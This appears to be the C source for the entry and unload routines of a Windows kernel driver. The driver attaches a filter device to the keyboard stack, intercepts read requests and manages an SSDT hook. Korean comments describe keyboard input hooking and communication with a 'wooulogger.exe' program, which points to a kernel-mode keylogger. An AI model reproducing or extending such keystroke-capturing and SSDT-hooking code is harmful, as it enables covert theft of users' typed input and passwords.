

#include "irp.h"
#include "ioctl.h"
#include "ssdt.h"

#define TIME_SECOND(x) x*10000000*-1


void MyDriverUnload(
	IN PDRIVER_OBJECT 	DriverObject
)
{
	KTIMER kTimer;
	LARGE_INTEGER timeout;
	timeout.QuadPart = (LONGLONG)TIME_SECOND(0.1);
	//UNREFERENCED_PARAMETER(DriverObject);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Driver unloading...\n");
	
	IoDetachDevice(((PMYDEVICE_EXTENSION)DriverObject->DeviceObject->DeviceExtension)->pKeyboardDevice);

	if(statHook == TRUE)
		unHookSSDT();

	KeInitializeTimer(&kTimer);

	while (irpCount > 0)
	{
		KeSetTimer(&kTimer, timeout, NULL);
		DbgPrintEx(DPFLTR_ACPI_ID, 0, "Waiting for irp processing to complete\n");
		DbgPrintEx(DPFLTR_ACPI_ID, 0, "irpCount:%x\n", irpCount);
		KeWaitForSingleObject(&kTimer, Executive, KernelMode, FALSE, NULL);
	}

	myCtrlDelete();
	myIrpDelete(DriverObject);
}

NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT 	DriverObject,
	IN PUNICODE_STRING	RegistryPath
)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Driver loading\n");
	DriverObject->DriverUnload = MyDriverUnload;

	myCtrlCreateLink(DriverObject, DEV_NAME, DEV_LINK);
	/*
	//wooulogger.exe와의 통신을 위한 MJ_FUCTION 등록.
	DriverObject->MajorFunction[IRP_MJ_CREATE] = myCtrlCreate;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = myCtrlControl;
	*/

	//키보드 입력 후킹 디바이스 생성.
	myAddDevice(DriverObject, KEYBOARD_DEVICE_NAME);

	DriverObject->MajorFunction[IRP_MJ_READ] = myRead;


	DbgPrintEx(DPFLTR_ACPI_ID, 0, "after DriverEntry\n");

	return STATUS_SUCCESS;
}

